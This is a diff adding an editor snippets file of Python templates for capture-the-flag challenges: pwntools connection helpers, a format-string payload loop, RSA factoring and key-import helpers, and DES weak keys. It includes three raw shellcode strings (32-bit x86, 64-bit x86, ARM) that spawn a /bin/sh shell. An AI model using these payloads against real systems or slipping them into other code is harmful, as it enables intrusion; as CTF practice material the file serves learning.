@@ -1,0 +1,83 @@
+# python snippets for ctf
+
+## Pwn
+
+snippet pwn
+	from pwn import *
+
+snippet remo
+	host = "${1}"
+	port = ${2}
+	r = remote(host, port)
+
+snippet proc
+	r = process("${1}")
+
+snippet sc32
+	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+snippet sc64
+	"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+snippet scarm
+	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
+
+snippet r
+	r.recvuntil("${1}")
+
+snippet s
+	r.sendline(${1})
+
+snippet inter
+	r.interactive()
+
+snippet fmt
+	prev = ""
+	for i in range(${1}):
+		payload += fmtchar(${2},(system >> i) & 0xff,${3})
+		prev = (system >> i) & 0xff
+
+## Crypto
+
+snippet rsa
+	import gmpy
+	import libnum
+	from factordb.factordb import FactorDB
+
+
+snippet factor
+	# CLI：factordb <num>
+	f = FactorDB(n)
+	f.connect()
+	p = f.get_factor_list()[0]
+	q = f.get_factor_list()[1]
+	# r = f.get_factor_list()[2]
+
+
+
+snippet n2s
+	from libnum import n2s
+
+snippet s2n
+	from libnum import s2n
+
+snippet importpem
+	from Crypto.PublicKey import RSA
+
+	KEY = RSA.importKey(open('${1}.pem','rb').read())
+	n = KEY.n
+	e = KEY.e
+
+snippet b2l
+	from Crypto.Util import number
+
+	${1} = number.bytes_to_long(open('${2}','rb').read())
+
+snippet DESweak
+	from Crypto.Cipher import DES
+
+	key = [ '\x01\x01\x01\x01\x01\x01\x01\x01',
+			'\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE',
+			'\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1',
+			'\x1F\x1F\x1F\x1F\x1F\x1F\x1F\x1F']
+
